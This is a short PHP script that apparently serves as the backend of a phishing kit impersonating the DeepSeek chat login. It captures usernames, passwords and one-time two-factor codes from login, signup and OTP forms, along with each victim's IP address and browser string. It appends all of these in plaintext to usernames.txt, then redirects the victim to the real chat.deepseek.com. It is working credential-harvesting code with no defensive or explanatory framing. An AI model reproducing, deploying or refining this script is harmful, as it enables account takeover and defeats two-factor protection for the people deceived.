<?php
session_start();

$form_type = $_POST['form_type'] ?? 'unknown';
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

$sanitize = function($val) {
    return trim(str_replace(["\r", "\n"], '', $val ?? 'Unknown'));
};

if ($form_type === 'login') {
    $identifier = $sanitize($_POST['identifier']);
    $pass = $sanitize($_POST['password']);
    $country = $sanitize($_POST['country_code'] ?? '+90');
    
    $data = "Username: " . $identifier . "\nPass: " . $pass . "\n[TYPE] LOGIN\n[COUNTRY] " . $country . "\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'next' => 'otp']);
    exit();
    
} elseif ($form_type === 'signup') {
    $name = $sanitize($_POST['full_name']);
    $identifier = $sanitize($_POST['identifier']);
    $pass = $sanitize($_POST['password']);
    $country = $sanitize($_POST['country_code'] ?? '+90');
    
    $data = "Username: " . $identifier . "\nPass: " . $pass . "\n[TYPE] SIGNUP\n[NAME] " . $name . "\n[COUNTRY] " . $country . "\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'next' => 'otp']);
    exit();
    
} elseif ($form_type === 'otp') {
    $identifier = $sanitize($_POST['identifier']);
    $pass = $sanitize($_POST['password']);
    $otp = $sanitize($_POST['otp_code']);
    
    $data = "Username: " . $identifier . "\nPass: " . $pass . "\nOTP: " . $otp . "\n[TYPE] OTP_SUBMIT\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Location: https://chat.deepseek.com/');
    exit();
    
} else {
    header('Location: https://chat.deepseek.com/');
    exit();
}
?>
